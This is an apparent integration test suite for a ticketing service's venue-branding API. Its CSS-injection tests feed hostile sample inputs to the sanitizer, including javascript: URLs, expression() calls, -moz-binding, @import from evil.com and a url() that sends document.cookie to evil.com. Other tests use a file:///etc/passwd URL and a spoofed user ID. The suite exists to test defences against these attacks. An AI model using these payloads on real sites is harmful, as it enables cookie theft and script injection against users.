/**
 * Integration tests for branding and CSS functionality
 *
 * Source Docs: services-support-analysis.md, TEST_MATRIX.md
 * Priority: HIGH (CSS injection vulnerability)
 *
 * Tests cover:
 * - Tier validation (white-label requirements)
 * - Color validation (hex format)
 * - CSS injection vulnerability (CRITICAL security)
 * - URL validation
 * - Database & caching behavior
 * - Authentication & tenant isolation
 */

import path from 'path';
import dotenv from 'dotenv';
dotenv.config({ path: path.join(__dirname, '../../.env.test') });

import request from 'supertest';
import jwt from 'jsonwebtoken';
import crypto from 'crypto';
import fs from 'fs';
import os from 'os';
import { getTestDb } from './helpers/db';
import { getTestRedis } from './helpers/redis';

// Generate RSA keypair for JWT signing
const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
});

const tempKeyDir = fs.mkdtempSync(path.join(os.tmpdir(), 'branding-test-keys-'));
const publicKeyPath = path.join(tempKeyDir, 'jwt-public.pem');
fs.writeFileSync(publicKeyPath, publicKey);

process.env.JWT_PUBLIC_KEY_PATH = publicKeyPath;
process.env.DISABLE_RATE_LIMIT = 'true';

// =============================================================================
// TEST CONSTANTS
// =============================================================================

// Tenant A (main test tenant)
const TENANT_A_ID = '11111111-1111-1111-1111-111111111111';
const USER_A_ID = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
const VENUE_A_WHITELABEL_ID = 'aaaa0001-0001-0001-0001-000000000001';
const VENUE_A_STANDARD_ID = 'aaaa0002-0002-0002-0002-000000000002';
const VENUE_A_ENTERPRISE_ID = 'aaaa0003-0003-0003-0003-000000000003';

// Tenant B (for isolation tests)
const TENANT_B_ID = '22222222-2222-2222-2222-222222222222';
const USER_B_ID = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb';
const VENUE_B_ID = 'bbbb0001-0001-0001-0001-000000000001';

// =============================================================================
// HELPER FUNCTIONS
// =============================================================================

function generateTestJWT(payload: {
  sub: string;
  tenant_id: string;
  email: string;
  permissions?: string[];
}): string {
  const now = Math.floor(Date.now() / 1000);
  return jwt.sign(
    {
      sub: payload.sub,
      email: payload.email,
      tenant_id: payload.tenant_id,
      permissions: payload.permissions || ['*'],
      iat: now,
      exp: now + 3600,
      iss: process.env.JWT_ISSUER || 'tickettoken-auth-service',
    },
    privateKey,
    { algorithm: 'RS256' }
  );
}

// =============================================================================
// TEST SUITE
// =============================================================================

describe('Branding & CSS Integration Tests', () => {
  let app: any;
  let db: any;
  let redis: any;
  let tokenA: string;
  let tokenB: string;

  beforeAll(async () => {
    const { buildApp } = await import('../../src/app');
    app = await buildApp();
    await app.ready();
    db = getTestDb();
    redis = getTestRedis();

    tokenA = generateTestJWT({
      sub: USER_A_ID,
      tenant_id: TENANT_A_ID,
      email: 'usera@example.com',
    });

    tokenB = generateTestJWT({
      sub: USER_B_ID,
      tenant_id: TENANT_B_ID,
      email: 'userb@example.com',
    });
  }, 30000);

  afterAll(async () => {
    if (app) await app.close();
    try {
      fs.unlinkSync(publicKeyPath);
      fs.rmdirSync(tempKeyDir);
    } catch {}
  });

  beforeEach(async () => {
    // Clean up database
    await db.raw('TRUNCATE TABLE tenants CASCADE');

    // Clear Redis
    const keys = await redis.keys('*');
    if (keys.length > 0) {
      await redis.del(...keys);
    }

    // ========================================
    // SETUP TENANT A
    // ========================================
    await db('tenants').insert({
      id: TENANT_A_ID,
      name: 'Tenant A',
      slug: 'tenant-a',
      created_at: new Date(),
      updated_at: new Date(),
    });

    await db('users').insert({
      id: USER_A_ID,
      tenant_id: TENANT_A_ID,
      email: 'usera@example.com',
      password_hash: '$2b$10$dummyhashfortestingpurposesonly',
      created_at: new Date(),
      updated_at: new Date(),
    });

    // White-label venue (CAN customize branding)
    await db('venues').insert({
      id: VENUE_A_WHITELABEL_ID,
      tenant_id: TENANT_A_ID,
      name: 'White Label Venue A',
      slug: 'whitelabel-venue-a',
      email: 'whitelabel@example.com',
      venue_type: 'comedy_club',
      max_capacity: 500,
      address_line1: '123 Test St',
      city: 'New York',
      state_province: 'NY',
      country_code: 'US',
      pricing_tier: 'white_label',
      status: 'active',
      created_by: USER_A_ID,
      created_at: new Date(),
      updated_at: new Date(),
    });

    // Standard venue (CANNOT customize branding)
    await db('venues').insert({
      id: VENUE_A_STANDARD_ID,
      tenant_id: TENANT_A_ID,
      name: 'Standard Venue A',
      slug: 'standard-venue-a',
      email: 'standard@example.com',
      venue_type: 'theater',
      max_capacity: 300,
      address_line1: '456 Test Ave',
      city: 'Boston',
      state_province: 'MA',
      country_code: 'US',
      pricing_tier: 'standard',
      status: 'active',
      created_by: USER_A_ID,
      created_at: new Date(),
      updated_at: new Date(),
    });

    // Enterprise venue (CAN customize branding)
    await db('venues').insert({
      id: VENUE_A_ENTERPRISE_ID,
      tenant_id: TENANT_A_ID,
      name: 'Enterprise Venue A',
      slug: 'enterprise-venue-a',
      email: 'enterprise@example.com',
      venue_type: 'arena',
      max_capacity: 1000,
      address_line1: '789 Enterprise Blvd',
      city: 'Chicago',
      state_province: 'IL',
      country_code: 'US',
      pricing_tier: 'enterprise',
      status: 'active',
      created_by: USER_A_ID,
      created_at: new Date(),
      updated_at: new Date(),
    });

    // ========================================
    // SETUP TENANT B
    // ========================================
    await db('tenants').insert({
      id: TENANT_B_ID,
      name: 'Tenant B',
      slug: 'tenant-b',
      created_at: new Date(),
      updated_at: new Date(),
    });

    await db('users').insert({
      id: USER_B_ID,
      tenant_id: TENANT_B_ID,
      email: 'userb@example.com',
      password_hash: '$2b$10$dummyhashfortestingpurposesonly',
      created_at: new Date(),
      updated_at: new Date(),
    });

    await db('venues').insert({
      id: VENUE_B_ID,
      tenant_id: TENANT_B_ID,
      name: 'Venue B',
      slug: 'venue-b',
      email: 'venueb@example.com',
      venue_type: 'concert_hall',
      max_capacity: 750,
      address_line1: '999 Other St',
      city: 'Seattle',
      state_province: 'WA',
      country_code: 'US',
      pricing_tier: 'white_label',
      status: 'active',
      created_by: USER_B_ID,
      created_at: new Date(),
      updated_at: new Date(),
    });

    // ========================================
    // SETUP PRICING TIERS
    // ========================================
    await db('white_label_pricing').insert([
      {
        tier_name: 'standard',
        monthly_fee: 0,
        max_custom_domains: 0,
        service_fee_percentage: 10,
        per_ticket_fee: 1.50,
        hide_platform_branding: false,
        created_at: new Date(),
        updated_at: new Date(),
      },
      {
        tier_name: 'white_label',
        monthly_fee: 99,
        max_custom_domains: 1,
        service_fee_percentage: 5,
        per_ticket_fee: 1.00,
        hide_platform_branding: true,
        created_at: new Date(),
        updated_at: new Date(),
      },
      {
        tier_name: 'enterprise',
        monthly_fee: 299,
        max_custom_domains: 5,
        service_fee_percentage: 3,
        per_ticket_fee: 0.75,
        hide_platform_branding: true,
        created_at: new Date(),
        updated_at: new Date(),
      },
    ]).onConflict('tier_name').ignore();
  });

  // ===========================================================================
  // TIER VALIDATION TESTS (5 tests)
  // ===========================================================================

  describe('Tier Validation', () => {
    it('should reject branding customization for standard tier venues', async () => {
      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_STANDARD_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ primaryColor: '#FF0000' });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('white-label or enterprise tier');
    });

    it('should allow branding customization for white-label tier venues', async () => {
      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ primaryColor: '#FF0000' });

      expect(response.status).toBe(200);
      expect(response.body.branding).toBeDefined();
    });

    it('should allow branding customization for enterprise tier venues', async () => {
      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_ENTERPRISE_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ primaryColor: '#00FF00' });

      expect(response.status).toBe(200);
      expect(response.body.branding).toBeDefined();
    });

    it('should return all pricing tiers from public endpoint', async () => {
      const response = await request(app.server)
        .get('/api/v1/branding/pricing/tiers');

      expect(response.status).toBe(200);
      expect(response.body.tiers).toHaveLength(3);
      expect(response.body.tiers.map((t: any) => t.tier_name)).toEqual(
        expect.arrayContaining(['standard', 'white_label', 'enterprise'])
      );
    });

    it('should reject invalid tier when changing tier', async () => {
      const response = await request(app.server)
        .post(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/tier`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ newTier: 'invalid_tier' });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('Invalid pricing tier');
    });
  });

  // ===========================================================================
  // COLOR VALIDATION TESTS (5 tests)
  // ===========================================================================

  describe('Color Validation', () => {
    it('should accept valid hex color format (#RRGGBB)', async () => {
      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ primaryColor: '#AABBCC' });

      expect(response.status).toBe(200);
    });

    it('should reject invalid hex color format', async () => {
      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ primaryColor: 'invalid-color' });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('Invalid hex color');
    });

    it('should reject hex color without hash prefix', async () => {
      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ primaryColor: 'AABBCC' });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('Invalid hex color');
    });

    it('should validate all color fields', async () => {
      // Valid colors should work
      const validResponse = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({
          primaryColor: '#111111',
          secondaryColor: '#222222',
          accentColor: '#333333',
          textColor: '#444444',
          backgroundColor: '#555555',
        });

      expect(validResponse.status).toBe(200);

      // Invalid secondaryColor should fail
      const invalidResponse = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({
          primaryColor: '#111111',
          secondaryColor: 'not-a-color',
        });

      expect(invalidResponse.status).toBe(400);
    });

    it('should reject short hex colors (#RGB format)', async () => {
      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ primaryColor: '#ABC' });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('Invalid hex color');
    });
  });

  // ===========================================================================
  // CSS INJECTION VULNERABILITY TESTS (10 tests) - CRITICAL
  // ===========================================================================

  describe('CSS Injection Vulnerability (CRITICAL)', () => {
    it('should sanitize javascript: URLs in CSS', async () => {
      const maliciousCSS = "body { background: url('javascript:alert(1)') }";

      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ customCss: maliciousCSS });

      expect(response.status).toBe(200);

      // Verify the CSS was sanitized
      const cssResponse = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/css`);

      expect(cssResponse.text).not.toContain('javascript:');
      expect(cssResponse.text).toContain('/* blocked */');
    });

    it('should sanitize @import directives', async () => {
      const maliciousCSS = "@import url('https://evil.com/steal.css');";

      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ customCss: maliciousCSS });

      expect(response.status).toBe(200);

      const cssResponse = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/css`);

      expect(cssResponse.text).not.toContain('@import');
    });

    it('should sanitize CSS expression() (IE vulnerability)', async () => {
      const maliciousCSS = "div { width: expression(alert('xss')) }";

      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ customCss: maliciousCSS });

      expect(response.status).toBe(200);

      const cssResponse = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/css`);

      expect(cssResponse.text).not.toContain('expression(');
    });

    it('should sanitize behavior: property (IE HTC vulnerability)', async () => {
      const maliciousCSS = "body { behavior: url(malicious.htc) }";

      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ customCss: maliciousCSS });

      expect(response.status).toBe(200);

      const cssResponse = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/css`);

      expect(cssResponse.text).not.toContain('behavior:');
    });

    it('should sanitize vbscript: URLs', async () => {
      const maliciousCSS = "body { background: url('vbscript:msgbox(1)') }";

      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ customCss: maliciousCSS });

      expect(response.status).toBe(200);

      const cssResponse = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/css`);

      expect(cssResponse.text).not.toContain('vbscript:');
    });

    it('should sanitize -moz-binding property (Firefox XBL vulnerability)', async () => {
      const maliciousCSS = "body { -moz-binding: url('http://evil.com/xbl.xml#xss') }";

      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ customCss: maliciousCSS });

      expect(response.status).toBe(200);

      const cssResponse = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/css`);

      expect(cssResponse.text).not.toContain('-moz-binding');
    });

    it('should sanitize url() function calls', async () => {
      const maliciousCSS = "body { background: url('http://evil.com/track?cookie=' + document.cookie) }";

      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ customCss: maliciousCSS });

      expect(response.status).toBe(200);

      const cssResponse = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/css`);

      expect(cssResponse.text).not.toMatch(/url\s*\(/i);
    });

    it('should allow safe CSS properties', async () => {
      const safeCSS = `
        .header { color: red; font-size: 16px; }
        .button { background-color: blue; border-radius: 4px; }
        * { box-sizing: border-box; }
      `;

      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ customCss: safeCSS });

      expect(response.status).toBe(200);

      const cssResponse = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/css`);

      expect(cssResponse.text).toContain('color: red');
      expect(cssResponse.text).toContain('font-size: 16px');
    });

    it('should truncate CSS that exceeds maximum length (50KB)', async () => {
      // Generate CSS that's over 50KB
      const longCSS = '.class { color: red; }'.repeat(5000); // ~110KB

      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ customCss: longCSS });

      expect(response.status).toBe(200);

      // Verify it was truncated
      const branding = await db('venue_branding')
        .where('venue_id', VENUE_A_WHITELABEL_ID)
        .first();

      expect(branding.custom_css.length).toBeLessThanOrEqual(50000);
    });

    it('should handle multiple attack vectors in single CSS', async () => {
      const multiAttackCSS = `
        @import url('https://evil.com/steal.css');
        body {
          background: url('javascript:alert(1)');
          behavior: url(evil.htc);
          -moz-binding: url(xss.xml#attack);
        }
        div { width: expression(evil()); }
      `;

      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ customCss: multiAttackCSS });

      expect(response.status).toBe(200);

      const cssResponse = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/css`);

      expect(cssResponse.text).not.toContain('@import');
      expect(cssResponse.text).not.toContain('javascript:');
      expect(cssResponse.text).not.toContain('behavior:');
      expect(cssResponse.text).not.toContain('-moz-binding');
      expect(cssResponse.text).not.toContain('expression(');
    });
  });

  // ===========================================================================
  // URL VALIDATION TESTS (5 tests)
  // ===========================================================================

  describe('URL Validation', () => {
    it('should accept valid HTTPS URLs', async () => {
      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ logoUrl: 'https://example.com/logo.png' });

      expect(response.status).toBe(200);
    });

    it('should accept valid HTTP URLs', async () => {
      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ logoUrl: 'http://example.com/logo.png' });

      expect(response.status).toBe(200);
    });

    it('should reject invalid URL format', async () => {
      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ logoUrl: 'not-a-valid-url' });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('Invalid');
    });

    it('should reject non-HTTP protocols (file://)', async () => {
      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ logoUrl: 'file:///etc/passwd' });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('Invalid logoUrl');
    });

    it('should validate all URL fields', async () => {
      // Valid URLs should work
      const validResponse = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({
          logoUrl: 'https://example.com/logo.png',
          logoDarkUrl: 'https://example.com/logo-dark.png',
          faviconUrl: 'https://example.com/favicon.ico',
          emailHeaderImage: 'https://example.com/header.png',
          ticketBackgroundImage: 'https://example.com/ticket-bg.png',
          ogImageUrl: 'https://example.com/og.png',
        });

      expect(validResponse.status).toBe(200);

      // Invalid faviconUrl should fail
      const invalidResponse = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({
          logoUrl: 'https://example.com/logo.png',
          faviconUrl: 'ftp://invalid.com/file',
        });

      expect(invalidResponse.status).toBe(400);
    });
  });

  // ===========================================================================
  // DATABASE & CACHING TESTS (10 tests)
  // ===========================================================================

  describe('Database & Caching', () => {
    it('should INSERT branding when it does not exist', async () => {
      // Verify no branding exists
      const before = await db('venue_branding')
        .where('venue_id', VENUE_A_WHITELABEL_ID)
        .first();
      expect(before).toBeUndefined();

      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ primaryColor: '#FF0000' });

      expect(response.status).toBe(200);

      // Verify branding was inserted
      const after = await db('venue_branding')
        .where('venue_id', VENUE_A_WHITELABEL_ID)
        .first();
      expect(after).toBeDefined();
      expect(after.primary_color).toBe('#FF0000');
    });

    it('should UPDATE branding when it already exists', async () => {
      // Insert initial branding
      await db('venue_branding').insert({
        venue_id: VENUE_A_WHITELABEL_ID,
        primary_color: '#000000',
        created_at: new Date(),
        updated_at: new Date(),
      });

      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ primaryColor: '#FFFFFF' });

      expect(response.status).toBe(200);

      // Verify branding was updated (not duplicated)
      const rows = await db('venue_branding')
        .where('venue_id', VENUE_A_WHITELABEL_ID);
      expect(rows).toHaveLength(1);
      expect(rows[0].primary_color).toBe('#FFFFFF');
    });

    it('should return default branding when none configured', async () => {
      const response = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`);

      expect(response.status).toBe(200);
      expect(response.body.branding.primary_color).toBe('#667eea');
      expect(response.body.branding.font_family).toBe('Inter');
    });

    it('should generate valid CSS with branding values', async () => {
      await db('venue_branding').insert({
        venue_id: VENUE_A_WHITELABEL_ID,
        primary_color: '#123456',
        secondary_color: '#654321',
        font_family: 'Roboto',
        created_at: new Date(),
        updated_at: new Date(),
      });

      const response = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/css`);

      expect(response.status).toBe(200);
      expect(response.headers['content-type']).toContain('text/css');
      expect(response.text).toContain('--brand-primary: #123456');
      expect(response.text).toContain('--brand-secondary: #654321');
      expect(response.text).toContain('--brand-font: Roboto');
    });

    it('should include custom CSS in generated CSS output', async () => {
      await db('venue_branding').insert({
        venue_id: VENUE_A_WHITELABEL_ID,
        primary_color: '#123456',
        custom_css: '.custom-class { padding: 10px; }',
        created_at: new Date(),
        updated_at: new Date(),
      });

      const response = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/css`);

      expect(response.status).toBe(200);
      expect(response.text).toContain('.custom-class { padding: 10px; }');
    });

    it('should serve branding from public endpoint without auth', async () => {
      await db('venue_branding').insert({
        venue_id: VENUE_A_WHITELABEL_ID,
        primary_color: '#ABCDEF',
        created_at: new Date(),
        updated_at: new Date(),
      });

      // No Authorization header
      const response = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`);

      expect(response.status).toBe(200);
      expect(response.body.branding.primary_color).toBe('#ABCDEF');
    });

    it('should record tier change in history', async () => {
      const response = await request(app.server)
        .post(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/tier`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ newTier: 'enterprise', reason: 'Upgrade request' });

      expect(response.status).toBe(200);

      // Verify tier was changed
      const venue = await db('venues')
        .where('id', VENUE_A_WHITELABEL_ID)
        .first();
      expect(venue.pricing_tier).toBe('enterprise');

      // Verify history was recorded
      const history = await db('venue_tier_history')
        .where('venue_id', VENUE_A_WHITELABEL_ID)
        .first();
      expect(history).toBeDefined();
      expect(history.from_tier).toBe('white_label');
      expect(history.to_tier).toBe('enterprise');
      expect(history.reason).toBe('Upgrade request');
    });

    it('should return tier history for authenticated user', async () => {
      // Insert some history
      await db('venue_tier_history').insert([
        {
          venue_id: VENUE_A_WHITELABEL_ID,
          from_tier: 'standard',
          to_tier: 'white_label',
          changed_by: USER_A_ID,
          reason: 'Initial upgrade',
          changed_at: new Date('2024-01-01'),
        },
        {
          venue_id: VENUE_A_WHITELABEL_ID,
          from_tier: 'white_label',
          to_tier: 'enterprise',
          changed_by: USER_A_ID,
          reason: 'Second upgrade',
          changed_at: new Date('2024-06-01'),
        },
      ]);

      const response = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/tier/history`)
        .set('Authorization', `Bearer ${tokenA}`);

      expect(response.status).toBe(200);
      expect(response.body.history).toHaveLength(2);
    });

    it('should handle concurrent branding updates correctly', async () => {
      // Send multiple updates concurrently
      const updates = await Promise.all([
        request(app.server)
          .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
          .set('Authorization', `Bearer ${tokenA}`)
          .send({ primaryColor: '#111111' }),
        request(app.server)
          .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
          .set('Authorization', `Bearer ${tokenA}`)
          .send({ primaryColor: '#222222' }),
        request(app.server)
          .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
          .set('Authorization', `Bearer ${tokenA}`)
          .send({ primaryColor: '#333333' }),
      ]);

      // All should succeed (upsert pattern)
      updates.forEach(response => {
        expect(response.status).toBe(200);
      });

      // Should have exactly one branding row
      const rows = await db('venue_branding')
        .where('venue_id', VENUE_A_WHITELABEL_ID);
      expect(rows).toHaveLength(1);
    });

    it('should map camelCase to snake_case correctly', async () => {
      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({
          primaryColor: '#AA0000',
          secondaryColor: '#00AA00',
          backgroundColor: '#0000AA',
          fontFamily: 'Arial',
          headingFont: 'Georgia',
          emailFromName: 'Test Venue',
        });

      expect(response.status).toBe(200);

      // Verify snake_case in database
      const branding = await db('venue_branding')
        .where('venue_id', VENUE_A_WHITELABEL_ID)
        .first();

      expect(branding.primary_color).toBe('#AA0000');
      expect(branding.secondary_color).toBe('#00AA00');
      expect(branding.background_color).toBe('#0000AA');
      expect(branding.font_family).toBe('Arial');
      expect(branding.heading_font).toBe('Georgia');
      expect(branding.email_from_name).toBe('Test Venue');
    });
  });

  // ===========================================================================
  // AUTHENTICATION & TENANT ISOLATION TESTS (5 tests)
  // ===========================================================================

  describe('Authentication & Tenant Isolation', () => {
    it('should require authentication for PUT branding', async () => {
      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .send({ primaryColor: '#FF0000' });

      expect(response.status).toBe(401);
    });

    it('should require authentication for tier change', async () => {
      const response = await request(app.server)
        .post(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/tier`)
        .send({ newTier: 'enterprise' });

      expect(response.status).toBe(401);
    });

    it('should require authentication for tier history', async () => {
      const response = await request(app.server)
        .get(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/tier/history`);

      expect(response.status).toBe(401);
    });

    it('should prevent Tenant B from updating Tenant A branding', async () => {
      const response = await request(app.server)
        .put(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}`)
        .set('Authorization', `Bearer ${tokenB}`)
        .send({ primaryColor: '#FF0000' });

      // Should be 403 Forbidden (not 404) to prevent enumeration
      expect([403, 400]).toContain(response.status);
    });

    it('should prevent Tenant B from changing Tenant A tier', async () => {
      const response = await request(app.server)
        .post(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/tier`)
        .set('Authorization', `Bearer ${tokenB}`)
        .send({ newTier: 'standard' });

      expect([403, 400]).toContain(response.status);
    });
  });

  // ===========================================================================
  // TIER CHANGE CASCADE TESTS (3 tests)
  // ===========================================================================

  describe('Tier Change Cascade Effects', () => {
    it('should update hide_platform_branding when tier changes', async () => {
      // Start with standard (hide_platform_branding = false)
      await db('venues')
        .where('id', VENUE_A_WHITELABEL_ID)
        .update({ pricing_tier: 'standard', hide_platform_branding: false });

      // Upgrade to enterprise
      const response = await request(app.server)
        .post(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/tier`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ newTier: 'enterprise' });

      expect(response.status).toBe(200);

      const venue = await db('venues')
        .where('id', VENUE_A_WHITELABEL_ID)
        .first();
      expect(venue.hide_platform_branding).toBe(true);
    });

    it('should suspend custom domain when downgrading to standard tier', async () => {
      // Setup: venue has custom domain
      await db('venues')
        .where('id', VENUE_A_WHITELABEL_ID)
        .update({ custom_domain: 'custom.example.com' });

      await db('custom_domains').insert({
        venue_id: VENUE_A_WHITELABEL_ID,
        domain: 'custom.example.com',
        verification_token: 'test-verification-token',
        status: 'verified',
        created_at: new Date(),
        updated_at: new Date(),
      });

      // Downgrade to standard
      const response = await request(app.server)
        .post(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/tier`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({ newTier: 'standard', reason: 'Downgrade' });

      expect(response.status).toBe(200);

      // Verify custom domain was cleared and suspended
      const venue = await db('venues')
        .where('id', VENUE_A_WHITELABEL_ID)
        .first();
      expect(venue.custom_domain).toBeNull();

      const domain = await db('custom_domains')
        .where('venue_id', VENUE_A_WHITELABEL_ID)
        .first();
      expect(domain.status).toBe('suspended');
    });

    it('should use authenticated user ID for tier change (not body userId)', async () => {
      const response = await request(app.server)
        .post(`/api/v1/branding/${VENUE_A_WHITELABEL_ID}/tier`)
        .set('Authorization', `Bearer ${tokenA}`)
        .send({
          newTier: 'enterprise',
          userId: 'attacker-trying-to-spoof-user-id'
        });

      expect(response.status).toBe(200);

      // Verify the actual user from JWT was recorded, not the spoofed one
      const history = await db('venue_tier_history')
        .where('venue_id', VENUE_A_WHITELABEL_ID)
        .orderBy('changed_at', 'desc')
        .first();

      expect(history.changed_by).toBe(USER_A_ID);
      expect(history.changed_by).not.toBe('attacker-trying-to-spoof-user-id');
    });
  });
});